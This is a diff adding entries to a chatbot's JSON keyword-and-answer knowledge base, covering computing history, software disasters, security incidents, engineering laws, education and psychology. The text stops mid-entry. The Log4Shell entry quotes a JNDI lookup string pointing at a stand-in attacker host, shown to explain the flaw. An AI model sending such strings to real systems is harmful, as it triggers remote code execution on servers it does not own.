@@ -3128,6 +3128,1347 @@
         "what can't you do"
       ],
       "answer": "I can't: access the internet in real-time, remember previous sessions, learn from conversation, understand images or voice, do math calculations, or guarantee accuracy. I'm a static knowledge base \u2014 I know what Akiva has written into my brain, nothing more. \ud83d\udc12"
+    },
+    {
+      "keywords": [
+        "python name",
+        "why python named",
+        "python language name"
+      ],
+      "answer": "Python was named after Monty Python's Flying Circus, the British comedy troupe \u2014 not the snake. Creator Guido van Rossum was reading the scripts during the holidays when he started the project. That's why Python tutorials are full of 'spam', 'eggs', and 'parrot' jokes. Logo is a snake because branding."
+    },
+    {
+      "keywords": [
+        "java name",
+        "why java named",
+        "java language origin"
+      ],
+      "answer": "Java was originally called Oak (after a tree outside James Gosling's window). Renamed Java because Oak was trademarked, and the team brainstormed at a coffee shop. Java = Indonesian coffee. The logo: a steaming cup. Made by Sun Microsystems in 1995, acquired by Oracle in 2010."
+    },
+    {
+      "keywords": [
+        "javascript name",
+        "js name",
+        "javascript named after java"
+      ],
+      "answer": "JavaScript was originally Mocha \u2192 LiveScript \u2192 JavaScript, renamed to ride on Java's hype in 1995. The two languages are unrelated except for some C-family syntax. Brendan Eich wrote the first version in 10 days. Standardization to ECMAScript happened in 1997 to navigate Sun's trademarks."
+    },
+    {
+      "keywords": [
+        "ruby name",
+        "why ruby named",
+        "ruby language origin"
+      ],
+      "answer": "Ruby was named after a co-worker's birthstone, by Yukihiro Matsumoto ('Matz') in 1993. Matz wanted a language that prioritized programmer happiness \u2014 and famously the language reflects it. Pearl and Coral were also considered; Ruby won. Inspired by Perl, Smalltalk, and Lisp."
+    },
+    {
+      "keywords": [
+        "go language name",
+        "golang name",
+        "go origin"
+      ],
+      "answer": "Go was created by Robert Griesemer, Rob Pike, and Ken Thompson at Google starting in 2007. Name simply meant 'as in goroutines and as in get-things-done.' The 'golang' variant is mostly a search-friendlier nickname. Released 2009. Mascot: the Go gopher, designed by Ren\u00e9e French."
+    },
+    {
+      "keywords": [
+        "rust name",
+        "why rust named",
+        "rust language origin"
+      ],
+      "answer": "Rust was named after the fungi (rusts), known for being highly survivable and distributed. Started by Graydon Hoare as a personal project in 2006; Mozilla sponsored it from 2009 to 2020. Now governed by the Rust Foundation. Mascot: Ferris the crab."
+    },
+    {
+      "keywords": [
+        "c language history",
+        "c name",
+        "c origin"
+      ],
+      "answer": "C was created by Dennis Ritchie at Bell Labs (1972) as a successor to B (which was a successor to BCPL). 'C' is just the next letter. Used to rewrite Unix in a portable language \u2014 the first OS not in assembly. Still ubiquitous: kernels, embedded, language runtimes. Ritchie's 'The C Programming Language' (with Kernighan) is canonical."
+    },
+    {
+      "keywords": [
+        "y2k bug",
+        "y2k",
+        "year 2000 problem"
+      ],
+      "answer": "Y2K bug: programs that stored years as two digits (87, 88...) would interpret 2000 as 1900. Massive remediation effort through 1998-1999 cost ~$300 billion. Result: very few catastrophic failures, which led some to think it was overblown \u2014 but the absence of failure WAS the success. Embedded systems and COBOL mainframes were the hardest cases."
+    },
+    {
+      "keywords": [
+        "ariane 5 bug",
+        "ariane 5",
+        "rocket bug"
+      ],
+      "answer": "Ariane 5 (1996): on its maiden flight, a $370M rocket exploded 37 seconds after launch. Cause: a 64-bit floating-point value (horizontal velocity) was converted to a 16-bit signed integer \u2014 overflow caused an exception, the inertial reference system shut down, the rocket veered, and the self-destruct triggered. The buggy code was inherited from Ariane 4, where the values stayed in range."
+    },
+    {
+      "keywords": [
+        "therac 25",
+        "therac-25",
+        "radiation therapy bug"
+      ],
+      "answer": "Therac-25 (1985-1987): medical radiation therapy machine with software bugs that delivered 100x intended doses. At least 6 deaths or severe injuries. Causes: race conditions, abandoned hardware interlocks (trusting software alone), no peer review of safety-critical code. Landmark case study in software safety and engineering ethics."
+    },
+    {
+      "keywords": [
+        "mars climate orbiter",
+        "metric imperial bug",
+        "nasa metric"
+      ],
+      "answer": "Mars Climate Orbiter (1999): $328M spacecraft lost because one engineering team used pound-seconds and another used newton-seconds. Orbital insertion calculation was off by a factor of 4.45; the orbiter passed too close to Mars and disintegrated in the atmosphere. The unit mismatch wasn't caught despite multiple reviews. Now: NASA mandates SI units across mission software."
+    },
+    {
+      "keywords": [
+        "knight capital",
+        "knight capital bug",
+        "trading bug"
+      ],
+      "answer": "Knight Capital (2012): a deployment left an old, dormant feature flag active on one server. In 45 minutes, the firm executed millions of unintended trades, losing $440M \u2014 bigger than the firm's previous year of profit. Knight nearly went bankrupt and was acquired. Causes: manual deployment, dead code resurrected, no automated rollback. Now a canonical case for CI/CD discipline."
+    },
+    {
+      "keywords": [
+        "morris worm",
+        "morris worm history",
+        "first internet worm"
+      ],
+      "answer": "Morris Worm (1988): one of the first internet worms, by Robert Tappan Morris (then a Cornell grad student, now an MIT professor). Spread via Unix bugs (fingerd, sendmail) and weak passwords. Intended to be discreet, but a bug caused massive reinfection \u2014 clogged ~10% of the then-tiny internet. Led to the founding of CERT (Computer Emergency Response Team). Morris was the first person convicted under the CFAA."
+    },
+    {
+      "keywords": [
+        "stuxnet",
+        "stuxnet worm",
+        "scada worm"
+      ],
+      "answer": "Stuxnet (2010): sophisticated worm targeting Iranian uranium enrichment centrifuges. Used four zero-days, valid digital certificates (stolen), and PLC code manipulation. Caused centrifuges to spin out of spec while reporting normal data. Widely attributed to US/Israeli cyber operations. Considered the first known cyber weapon to cause physical-world damage at scale."
+    },
+    {
+      "keywords": [
+        "solarwinds hack",
+        "solarwinds breach",
+        "supply chain attack"
+      ],
+      "answer": "SolarWinds (2020): nation-state attackers compromised Orion's build system, planting a backdoor (SUNBURST) in legitimate signed updates. ~18,000 organizations installed the trojanized update; targeted intrusions hit US government agencies and Fortune 500s. Pivotal supply-chain attack \u2014 prompted SBOM mandates and stricter build pipeline security."
+    },
+    {
+      "keywords": [
+        "log4shell",
+        "log4j vulnerability",
+        "cve-2021-44228"
+      ],
+      "answer": "Log4Shell (Dec 2021): critical RCE in Log4j (Java's most popular logging library). Logging a user-controlled string like `${jndi:ldap://attacker.com/x}` made Log4j fetch and execute remote code. Internet-wide emergency: probably the worst vuln since Heartbleed. Source: Log4j's JNDI lookup feature, unsafely enabled by default. Lessons: dependencies are infrastructure; treat them accordingly."
+    },
+    {
+      "keywords": [
+        "unix history",
+        "unix origin",
+        "unix story"
+      ],
+      "answer": "Unix: created at Bell Labs by Ken Thompson and Dennis Ritchie (~1969). Initially a side project. Rewritten in C \u2014 first portable OS. Inspired BSD (UC Berkeley), then Linux (Linus Torvalds, 1991), and conceptually macOS and most modern servers. Philosophy: small tools that do one thing well, connected by pipes. Still shapes everything we use."
+    },
+    {
+      "keywords": [
+        "von neumann",
+        "john von neumann",
+        "von neumann architecture"
+      ],
+      "answer": "John von Neumann (1903-1957): Hungarian-American polymath. Defined the 'von Neumann architecture' that nearly all computers use: shared memory for code AND data, central processor, control unit. Also contributed to: quantum mechanics, game theory, atomic bomb (Manhattan Project), cellular automata. Famously fast at mental math."
+    },
+    {
+      "keywords": [
+        "dijkstra",
+        "edsger dijkstra",
+        "dijkstra quotes"
+      ],
+      "answer": "Edsger Dijkstra (1930-2002): Dutch computer scientist. Famous for: shortest-path algorithm (Dijkstra's), semaphores, structured programming, 'GOTO considered harmful'. Famously opinionated and provocative ('Computer Science is no more about computers than astronomy is about telescopes'). Wrote technical notes ('EWDs') as handwritten manuscripts; many influential."
+    },
+    {
+      "keywords": [
+        "donald knuth",
+        "knuth",
+        "art of computer programming"
+      ],
+      "answer": "Donald Knuth: author of 'The Art of Computer Programming' (started 1962, still ongoing). Created TeX (typesetting system used for most academic papers) when frustrated with publisher's typography. Stanford professor emeritus. Famous offer: $2.56 (one hexadecimal dollar) for any errors found in his books. Coined the term 'analysis of algorithms'."
+    },
+    {
+      "keywords": [
+        "barbara liskov",
+        "liskov",
+        "liskov substitution"
+      ],
+      "answer": "Barbara Liskov: first woman to earn a PhD in CS in the US (1968). Created the CLU language. Liskov Substitution Principle (LSP) bears her name \u2014 subtypes must be substitutable for their base types without breaking correctness. The 'L' in SOLID. Won the Turing Award in 2008."
+    },
+    {
+      "keywords": [
+        "grace hopper",
+        "admiral hopper",
+        "cobol creator"
+      ],
+      "answer": "Grace Hopper (1906-1992): US Navy admiral and computing pioneer. Coined the term 'compiler' and built the first one (A-0 system, 1952). Co-designed COBOL \u2014 making programming accessible without math degrees. Famously found the literal first computer 'bug' (a moth in a relay). Tireless advocate for human-readable programming."
+    },
+    {
+      "keywords": [
+        "dennis ritchie",
+        "ritchie",
+        "c creator unix creator"
+      ],
+      "answer": "Dennis Ritchie (1941-2011): co-created Unix and C at Bell Labs with Ken Thompson. Astonishing legacy \u2014 the two technologies that underpin nearly all modern computing. Famously self-effacing. Died the same week as Steve Jobs; got far less press, despite arguably broader impact. The 'R' in K&R (Kernighan and Ritchie's C book)."
+    },
+    {
+      "keywords": [
+        "ken thompson",
+        "thompson",
+        "unix creator"
+      ],
+      "answer": "Ken Thompson: created Unix with Dennis Ritchie at Bell Labs. Also: B language (precursor to C), regular expressions implementation in QED editor, UTF-8 (with Rob Pike), Plan 9, Go language (with Pike and Griesemer). His 'Reflections on Trusting Trust' (1984 Turing lecture) is essential reading on supply-chain trust."
+    },
+    {
+      "keywords": [
+        "brian kernighan",
+        "kernighan",
+        "awk creator"
+      ],
+      "answer": "Brian Kernighan: co-author of 'The C Programming Language' (K&R), helped create AWK (the K), did much of the early Unix documentation. Princeton professor. Coined 'Hello, world!' as a teaching example. Sharp, generous, still actively writing about programming."
+    },
+    {
+      "keywords": [
+        "john mccarthy",
+        "mccarthy",
+        "lisp creator"
+      ],
+      "answer": "John McCarthy (1927-2011): created Lisp in 1958 (second-oldest high-level language still in use, after Fortran). Coined 'artificial intelligence'. Pioneered time-sharing and garbage collection. Founded Stanford's AI Lab. His 1960 'Recursive Functions of Symbolic Expressions and Their Computation by Machine' paper is a CS classic."
+    },
+    {
+      "keywords": [
+        "alan kay",
+        "kay",
+        "smalltalk creator"
+      ],
+      "answer": "Alan Kay: invented Smalltalk and the concept of object-oriented programming as he meant it ('it's all about messaging, not objects'). Worked at Xerox PARC during its legendary 1970s era \u2014 much of modern personal computing (windowing, GUI, mouse, laser printing) traces to PARC. Famous quote: 'The best way to predict the future is to invent it.'"
+    },
+    {
+      "keywords": [
+        "unix philosophy",
+        "do one thing well"
+      ],
+      "answer": "The Unix philosophy (Doug McIlroy, distilled by others): write programs that do one thing well; write programs to work together; write programs to handle text streams, because that is a universal interface. Compose small tools with pipes. Foundation of how Unix and Linux feel different from Windows DOS \u2014 and why developers fall in love with the terminal."
+    },
+    {
+      "keywords": [
+        "worse is better",
+        "gabriel essay",
+        "worse is better essay"
+      ],
+      "answer": "'Worse is Better' (Richard Gabriel, 1989): argues that the 'worse is better' design philosophy (Unix/C: simplicity and implementation matter more than completeness) wins over 'the right thing' (Lisp: completeness, consistency, correctness) in the long run because it spreads faster and gets fixed in place. Provocative; debated for decades; explains a lot of tech adoption."
+    },
+    {
+      "keywords": [
+        "cathedral bazaar",
+        "esr",
+        "open source models"
+      ],
+      "answer": "'The Cathedral and the Bazaar' (Eric Raymond, 1997): contrasts the 'cathedral' model (small group of developers, releases at intervals, GNU style) with the 'bazaar' (Linux style \u2014 open development, release early/often, many eyes find bugs). Influential essay that helped sell open source to enterprises. Coined 'Linus's Law': given enough eyeballs, all bugs are shallow."
+    },
+    {
+      "keywords": [
+        "conway's law",
+        "conway law",
+        "org reflects software"
+      ],
+      "answer": "Conway's Law (1967): 'Any organization that designs a system will produce a design whose structure is a copy of the organization's communication structure.' If three teams build a compiler, you get a three-pass compiler. Inverse Conway maneuver: design teams to match the architecture you want. Microservices boundaries often follow team boundaries."
+    },
+    {
+      "keywords": [
+        "goodharts law",
+        "goodhart",
+        "measure target"
+      ],
+      "answer": "Goodhart's Law: 'When a measure becomes a target, it ceases to be a good measure.' Examples: optimizing code coverage \u2192 meaningless tests; optimizing PR throughput \u2192 trivial PRs; optimizing call center handle time \u2192 rushed customer experiences. Use multiple, balanced metrics. Discuss outcomes, not just numbers. Goodharting is unavoidable but manageable."
+    },
+    {
+      "keywords": [
+        "brooks law",
+        "fred brooks",
+        "mythical man month"
+      ],
+      "answer": "Brooks's Law: 'Adding manpower to a late software project makes it later.' From Fred Brooks's 'The Mythical Man-Month' (1975) \u2014 still painfully relevant. Reasons: ramp-up time, communication overhead (n\u00b2 edges), training pulls existing engineers off the work. Lesson: don't fix schedules with bodies. Cut scope, slip the date, or both."
+    },
+    {
+      "keywords": [
+        "hofstadter law",
+        "hofstadter",
+        "time estimates"
+      ],
+      "answer": "Hofstadter's Law: 'It always takes longer than you expect, even when you take into account Hofstadter's Law.' From Douglas Hofstadter's 'G\u00f6del, Escher, Bach' (1979). Self-referential, hence funny \u2014 and depressingly accurate to software estimation. Add buffers, ship slices, prepare to be surprised anyway."
+    },
+    {
+      "keywords": [
+        "postel's law",
+        "postels law",
+        "robustness principle"
+      ],
+      "answer": "Postel's Law (Robustness Principle): 'Be conservative in what you do, be liberal in what you accept from others.' Authored by Jon Postel (TCP/IP). For decades the internet's guiding rule; lately criticized \u2014 being liberal in input perpetuates non-standard senders and creates security risks. Modern stance: be strict in what you accept, with clear errors."
+    },
+    {
+      "keywords": [
+        "chestertons fence",
+        "chesterton's fence",
+        "why was this here"
+      ],
+      "answer": "Chesterton's Fence: don't remove a fence until you know why it was put up. Apply to legacy code: that weird line was probably there for a reason; understand it before deleting. From G.K. Chesterton's 1929 book. Particularly valuable in codebases with low documentation \u2014 `git blame` and ADRs become Chesterton's-Fence tools."
+    },
+    {
+      "keywords": [
+        "hyrums law",
+        "hyrum's law",
+        "implicit api"
+      ],
+      "answer": "Hyrum's Law: 'With a sufficient number of users of an API, it does not matter what you promise in the contract: all observable behaviors of your system will be depended on by somebody.' Named for Hyrum Wright. Implication: every accidental behavior becomes a contract. Even adding a previously-empty field can break someone. Why versioning and explicit compat policies matter."
+    },
+    {
+      "keywords": [
+        "galls law",
+        "gall law",
+        "working complex system"
+      ],
+      "answer": "Gall's Law: 'A complex system that works is invariably found to have evolved from a simple system that worked. A complex system designed from scratch never works and cannot be patched up to make it work. You have to start over with a working simple system.' From John Gall's 'Systemantics' (1975). Why monoliths are usually a better starting point than microservices."
+    },
+    {
+      "keywords": [
+        "quantum computing deeper",
+        "quantum bits",
+        "qubits explained"
+      ],
+      "answer": "Quantum computing: uses qubits (quantum bits) that can be in superposition (0 and 1 simultaneously) and entangled. Quantum gates manipulate them. Algorithms like Shor's (factoring large numbers, breaking RSA) and Grover's (search) offer exponential or quadratic speedups for specific problems. Current state: noisy intermediate-scale quantum (NISQ) \u2014 ~100-1000 qubits, error-prone. Not faster for general computing \u2014 only specific problem classes. Leaders: IBM, Google, Rigetti, IonQ."
+    },
+    {
+      "keywords": [
+        "ai consciousness",
+        "machine consciousness",
+        "is ai conscious"
+      ],
+      "answer": "AI consciousness is unresolved philosophically and empirically. Open questions: do current LLMs have anything like 'experience'? Probably not \u2014 they're function approximators trained on text. But we lack a test that conclusively rules it in or out. Frameworks: Integrated Information Theory (Tononi), Global Workspace Theory, Higher-Order Theories. The 'hard problem' of consciousness (Chalmers) remains unsolved for biological brains too \u2014 so claims about machines are necessarily speculative."
+    },
+    {
+      "keywords": [
+        "game theory deeper",
+        "nash equilibrium",
+        "game theory"
+      ],
+      "answer": "Game theory: math of strategic interaction. Nash equilibrium: each player's strategy is optimal given others'. Prisoner's Dilemma: individually rational \u2192 collectively bad. Zero-sum (poker, chess) vs positive-sum (trade) vs negative-sum (war). Mechanism design: design rules so individual incentives align with collective good (auctions, voting). Evolutionary game theory explains animal behavior and norms. Repeated games: cooperation can emerge (tit-for-tat)."
+    },
+    {
+      "keywords": [
+        "nato",
+        "north atlantic treaty",
+        "nato role"
+      ],
+      "answer": "NATO (North Atlantic Treaty Organization, 1949): military alliance of 32 countries (after 2024). Founded post-WWII to deter Soviet expansion in Europe. Article 5: attack on one is attack on all (invoked once \u2014 after 9/11 attacks on US). Expanded eastward after Cold War, controversial with Russia. Funded by member contributions (target 2% of GDP \u2014 many members don't hit it)."
+    },
+    {
+      "keywords": [
+        "united nations",
+        "un",
+        "un role"
+      ],
+      "answer": "United Nations (1945): international organization of 193 member states, founded after WWII to prevent another world war. Bodies: General Assembly (one vote per country), Security Council (5 permanent members with veto: US, UK, France, Russia, China + 10 rotating), International Court of Justice, agencies (WHO, UNICEF, UNHCR). Criticisms: ineffective in great-power conflicts (veto), slow, bureaucratic. Still: largest forum for diplomacy."
+    },
+    {
+      "keywords": [
+        "international law",
+        "public international law",
+        "intl law"
+      ],
+      "answer": "International law: rules between states. Sources: treaties (e.g., Geneva Conventions, UN Charter), customary law, general principles, judicial decisions. No global enforcement \u2014 relies on state consent and reciprocity. International Court of Justice settles state disputes; International Criminal Court prosecutes individuals for war crimes/genocide. Tension: sovereignty vs human rights, especially when states refuse jurisdiction."
+    },
+    {
+      "keywords": [
+        "climate change solutions",
+        "decarbonization",
+        "climate fixes"
+      ],
+      "answer": "Climate change solutions: rapidly cut greenhouse gas emissions and remove what's already there. Largest levers: clean electricity (solar + wind + storage + nuclear), electrification of transport (EVs) and buildings (heat pumps), industrial decarbonization (green steel, cement, hydrogen), reducing methane (oil/gas leaks, livestock), reforestation, carbon removal (DAC \u2014 Direct Air Capture). Policy: carbon pricing, subsidies, mandates. Project Drawdown ranks solutions by impact."
+    },
+    {
+      "keywords": [
+        "space colonization",
+        "mars colony",
+        "colonize space"
+      ],
+      "answer": "Space colonization challenges: radiation (no atmosphere/magnetic field to shield), microgravity (bone/muscle loss), psychological isolation, food (closed-loop ecosystems hard), water, oxygen, fuel, communication delay (Mars: 4-24 minutes one-way). Mars often discussed (SpaceX) but vastly harder than people realize. Closer term: Moon base, Lagrange point stations, asteroid mining. O'Neill cylinders (rotating habitats) more sci-fi but possibly easier than terraforming planets."
+    },
+    {
+      "keywords": [
+        "synthetic biology",
+        "synbio",
+        "bioengineering"
+      ],
+      "answer": "Synthetic biology: engineer biological systems for new functions. Tools: CRISPR-Cas9 (precision gene editing), DNA synthesis (write custom DNA from scratch), gene drives (force inheritance of a gene). Applications: insulin in yeast, lab-grown meat, mRNA vaccines, biofuels, drought-resistant crops. Risks: dual-use (could engineer pathogens), ecosystem impact of gene drives. Governance: BWC treaty, iGEM community norms."
+    },
+    {
+      "keywords": [
+        "brain computer interface",
+        "bci",
+        "neuralink"
+      ],
+      "answer": "Brain-computer interfaces (BCIs): direct brain-to-computer signals. Non-invasive (EEG, fNIRS) \u2014 low resolution, no surgery. Invasive (Neuralink, BrainGate, Synchron stentrode) \u2014 high resolution, surgical risk. Current uses: cursor control for paralyzed patients (multiple human trials), seizure prediction, cochlear/retinal implants (decades old). Speculative: telepathy, memory enhancement. Ethics: privacy of thought, augmentation inequality."
+    },
+    {
+      "keywords": [
+        "digital privacy",
+        "data privacy",
+        "online privacy"
+      ],
+      "answer": "Digital privacy: limiting who can see/use your data. Threats: ad-tech tracking (cookies, fingerprinting, identity graphs across devices), data brokers (sell aggregated profiles), data breaches, government surveillance. Defenses: privacy-respecting browsers (Firefox, Brave), tracker blockers (uBlock Origin, Privacy Badger), VPNs (limited \u2014 shifts trust to provider), encrypted messaging (Signal), minimize sharing. Regulation: GDPR (EU), CCPA (California) \u2014 uneven enforcement."
+    },
+    {
+      "keywords": [
+        "surveillance capitalism",
+        "zuboff",
+        "surveillance economy"
+      ],
+      "answer": "Surveillance capitalism (Shoshana Zuboff): economic system where companies harvest user behavior data as 'free raw material' for prediction products sold to advertisers and others. Pioneered by Google, refined by Facebook. Concerns: behavior modification (engagement-optimized content), erosion of privacy, asymmetric power, democracy effects (echo chambers, microtargeting). Counters: regulation, alternative business models (subscriptions, public funding), digital literacy."
+    },
+    {
+      "keywords": [
+        "platform economics",
+        "two sided market",
+        "network effects"
+      ],
+      "answer": "Platform economics: companies that connect two (or more) sides \u2014 riders/drivers (Uber), buyers/sellers (eBay), guests/hosts (Airbnb), developers/users (App Store). Cross-side network effects: more drivers \u2192 more riders \u2192 more drivers. Winner-take-most dynamics. Strategy: subsidize one side to build the other, then extract value. Lock-in via data, switching cost, integration. Regulation: antitrust, payment terms, gig worker classification."
+    },
+    {
+      "keywords": [
+        "network effects deeper",
+        "network effect",
+        "metcalfe"
+      ],
+      "answer": "Network effects: value increases with users. Direct (telephones \u2014 every new user adds value to all). Indirect / two-sided (more iPhone users \u2192 more apps \u2192 more iPhone value). Data network effects (more users \u2192 better ML \u2192 better product). Metcalfe's Law: value ~ n\u00b2 (criticized as too generous; reality more like n log n). Companies with strong network effects (Google search, FB social) become very hard to dislodge."
+    },
+    {
+      "keywords": [
+        "winner take all",
+        "winner takes all",
+        "winner take all markets"
+      ],
+      "answer": "Winner-take-all (winner-take-most) markets: small differences in quality/timing produce huge outcome gaps. Drivers: network effects, economies of scale, low marginal cost of digital goods, search/ranking (top result gets most clicks). Examples: search engines, social networks, app stores, marketplaces. Implications: high incumbent moats, runner-up positions often unviable, regulator concerns about monopolies."
+    },
+    {
+      "keywords": [
+        "gig economy",
+        "gig workers",
+        "uber lyft workers"
+      ],
+      "answer": "Gig economy: short-term, flexible work mediated by platforms (Uber, DoorDash, Instacart, Upwork). Classified as independent contractors \u2014 no minimum wage, health insurance, paid leave in many jurisdictions. Worker advocacy pushes for employee status (California's AB5, UK Uber ruling) or a 'third category' with portable benefits. Trade-offs: flexibility valued by many; insecurity hurts others. Algorithm-managed work is a new labor frontier."
+    },
+    {
+      "keywords": [
+        "future of education",
+        "education future",
+        "ed tech"
+      ],
+      "answer": "Future of education: trends include personalized AI tutors (Khanmigo, etc \u2014 promising for differentiated practice), competency-based progression (move when you've learned, not when calendar says), micro-credentials (replace some degrees), unbundling (online specialty courses), more project-based + experiential learning, hybrid models. Universities under pressure on cost, accreditation moats remain strong. K-12 reforms slow but tools accelerating."
+    },
+    {
+      "keywords": [
+        "homeschooling",
+        "homeschool",
+        "traditional school"
+      ],
+      "answer": "Homeschooling vs traditional school: homeschool pros \u2014 personalized pace, family time, no bullying, customized curriculum, more efficient time use. Cons \u2014 socialization (mitigated by co-ops, sports, etc), parent workload, requires parent capability. Traditional pros \u2014 credentialed teachers, peer interaction, broader exposure, parent freedom. Outcomes: studies suggest comparable or better academic results for homeschoolers on average, with high variance. Legal in all US states; varies widely by country."
+    },
+    {
+      "keywords": [
+        "unschooling",
+        "child led learning",
+        "unschool"
+      ],
+      "answer": "Unschooling: child-led learning without imposed curriculum. Children pursue interests; parents facilitate, expose to opportunities. Founded by John Holt. Differs from 'school at home' (which mimics school). Critics: gaps in foundational skills, limited college pathways. Advocates: deep mastery in chosen areas, intrinsic motivation, real-world skills. Works best with engaged, resource-rich families."
+    },
+    {
+      "keywords": [
+        "project based learning",
+        "pbl",
+        "project learning"
+      ],
+      "answer": "Project-based learning (PBL): students learn by working on extended, meaningful projects with real audiences. Drives motivation and integration of skills. Examples: design a community garden, build a working catapult, publish a magazine. Done well, retention and skill transfer exceed lectures. Done poorly, becomes 'craft projects' without rigor. Edutopia and HighTechHigh have strong resources."
+    },
+    {
+      "keywords": [
+        "montessori",
+        "maria montessori",
+        "montessori method"
+      ],
+      "answer": "Montessori method: developed by Maria Montessori (Italy, early 1900s). Child-led learning in prepared environments with specially designed materials (sensory, math beads, movable alphabet). Mixed-age classrooms (3-year cycles). Uninterrupted work periods. Teacher = guide, not lecturer. Emphasis on practical life skills, independence, intrinsic motivation. Available globally; quality varies (the trademark isn't restricted, so 'Montessori' schools vary)."
+    },
+    {
+      "keywords": [
+        "waldorf",
+        "steiner education",
+        "waldorf school"
+      ],
+      "answer": "Waldorf (Steiner) education: founded by Rudolf Steiner (Austria, 1919). Emphasizes imagination, arts, crafts, and 'whole child' development. Stages: imitation (0-7), feeling (7-14), thinking (14-21). Reading often introduced later than mainstream (around age 7). Anthroposophy (Steiner's spiritual philosophy) influences curriculum; controversial in some respects (esoteric claims, race-related historical writings). Strong arts/community emphasis appeals to many families."
+    },
+    {
+      "keywords": [
+        "trauma informed",
+        "trauma informed teaching",
+        "tic"
+      ],
+      "answer": "Trauma-informed practice: recognize that many people (especially in schools, healthcare, justice systems) carry trauma that shapes behavior. Principles: safety, trustworthiness, choice, collaboration, empowerment. Shift questions from 'what's wrong with you?' to 'what happened to you?'. Reduce re-traumatization (consider what triggers, control, dignity look like in interactions). Roots in ACEs research (Adverse Childhood Experiences study)."
+    },
+    {
+      "keywords": [
+        "social emotional learning",
+        "sel",
+        "emotional intelligence school"
+      ],
+      "answer": "Social-emotional learning (SEL): teach self-awareness, self-management, social awareness, relationship skills, responsible decision-making. CASEL framework most cited. Evidence: meta-analyses show academic and behavioral benefits. Implementations vary widely; sometimes politicized. Done well, integrated into classroom culture, not bolted on as a 30-min weekly module."
+    },
+    {
+      "keywords": [
+        "growth mindset",
+        "growth mindset science",
+        "dweck"
+      ],
+      "answer": "Growth mindset (Carol Dweck): belief that abilities can be developed through effort and learning, vs fixed mindset (abilities are innate). Praising effort/process over fixed traits ('you worked hard' vs 'you're smart') correlates with better long-term outcomes. Caveats: original effect sizes have weakened in replications; not a panacea. Useful frame, especially paired with feedback and instruction \u2014 not just slogans."
+    },
+    {
+      "keywords": [
+        "fixed vs growth",
+        "fixed mindset",
+        "mindset comparison"
+      ],
+      "answer": "Fixed vs growth mindset: fixed \u2014 abilities are stable traits ('I'm not a math person'). Growth \u2014 abilities can grow ('I'm not a math person yet'). Fixed mindset can lead to avoiding challenges, hiding mistakes. Growth mindset can lead to embracing learning. Reality: people hold mixed mindsets across domains and contexts. Most useful: notice your fixed-mindset triggers (rejection, public failure) and reframe."
+    },
+    {
+      "keywords": [
+        "deliberate practice",
+        "ericsson practice",
+        "skill development"
+      ],
+      "answer": "Deliberate practice (Anders Ericsson): focused, effortful practice targeting specific weaknesses with immediate feedback. Not just hours \u2014 Ericsson is misquoted (the '10,000 hours' is Gladwell's simplification). Key elements: well-defined goals, full focus, immediate feedback, stretch beyond comfort, repetition with refinement. Most professionals plateau at 'good enough' and never deliberately practice \u2014 that's why elite outliers exist."
+    },
+    {
+      "keywords": [
+        "expert performance",
+        "expert skill",
+        "mastery"
+      ],
+      "answer": "Expert performance research: experts differ from novices in pattern recognition (chunking), mental models, faster perception of cues, automated subroutines (freeing working memory). 'Talent' often = early start + supportive environment + sustained deliberate practice. Domain-specific \u2014 being an expert in one field gives little transfer. Plateau at any level is breakable with renewed deliberate practice on the right weaknesses."
+    },
+    {
+      "keywords": [
+        "flow state science",
+        "flow",
+        "mihaly flow"
+      ],
+      "answer": "Flow state (Mihaly Csikszentmihalyi): fully immersed, energized focus, time distortion, intrinsic enjoyment. Conditions: clear goals, immediate feedback, skill matched to challenge (or slightly stretched). Hard to enter when distracted, sick, or stuck. Tactics: protect blocks of uninterrupted time, single-task, pre-commit to a specific goal, eliminate friction. Devs in flow can be ~5x more productive \u2014 protecting it is high leverage."
+    },
+    {
+      "keywords": [
+        "intrinsic motivation",
+        "sdt motivation",
+        "extrinsic motivation"
+      ],
+      "answer": "Intrinsic vs extrinsic motivation: intrinsic = doing for inherent satisfaction. Extrinsic = doing for external reward/avoid punishment. Self-Determination Theory (Deci & Ryan): three needs \u2014 autonomy, competence, relatedness \u2014 drive intrinsic motivation. Over-justification effect: extrinsic rewards can erode intrinsic motivation when the activity is already enjoyable. Implications for management: too much micro-reward can demotivate."
+    },
+    {
+      "keywords": [
+        "self determination theory",
+        "sdt",
+        "autonomy competence"
+      ],
+      "answer": "Self-Determination Theory (SDT, Deci & Ryan): three fundamental psychological needs \u2014 Autonomy (control over choices), Competence (sense of mastery), Relatedness (connection with others). Environments that support these foster intrinsic motivation and well-being; environments that thwart them produce disengagement. Practical apps: workplace design, education, parenting, software UX (Duolingo leans hard on SDT)."
+    },
+    {
+      "keywords": [
+        "gratitude science",
+        "gratitude journal",
+        "gratitude practice"
+      ],
+      "answer": "Gratitude practice (writing 3 things you're grateful for, daily or weekly): one of the most studied positive interventions. Modest, repeatable effects on well-being, sleep, relationship satisfaction, perceived stress. Effects fade with rote \u2014 keep it specific and varied. Tested forms: gratitude letter (write to someone specific, optionally deliver), gratitude visit (deliver in person \u2014 large short-term effect)."
+    },
+    {
+      "keywords": [
+        "forgiveness science",
+        "forgiveness research",
+        "forgive"
+      ],
+      "answer": "Forgiveness research: forgiveness is associated with lower stress, better cardiovascular health, lower depression. Doesn't require reconciliation or excusing harm. REACH framework (Worthington): Recall hurt, Empathize, Altruistic gift of forgiveness, Commit, Hold on. Forgiving 'too quickly' can short-circuit grief and protective anger \u2014 pace it. Self-forgiveness is harder and often more important."
+    },
+    {
+      "keywords": [
+        "compassion fatigue",
+        "caregiver burnout",
+        "helper burnout"
+      ],
+      "answer": "Compassion fatigue: emotional exhaustion in caregivers (nurses, therapists, teachers, social workers). Differs from burnout \u2014 comes specifically from sustained empathic engagement with others' suffering. Symptoms: numbing, intrusive thoughts, withdrawal, hyperarousal. Prevention: workload management, supervision, peer support, self-care, meaning-making. Replenishment activities help; 'just take a vacation' rarely fixes it."
+    },
+    {
+      "keywords": [
+        "resilience science",
+        "resilience research",
+        "bouncing back"
+      ],
+      "answer": "Resilience: ability to recover and adapt after adversity. Not a fixed trait \u2014 built through experience and support. Factors: stable supportive relationships, sense of agency, meaning-making, physical health, emotion regulation skills, problem-solving capacity. Most people are surprisingly resilient \u2014 'ordinary magic' (Ann Masten). Trauma changes people, but doesn't inevitably damage them. Post-traumatic growth: some emerge stronger."
+    },
+    {
+      "keywords": [
+        "post traumatic growth",
+        "ptg",
+        "growth from trauma"
+      ],
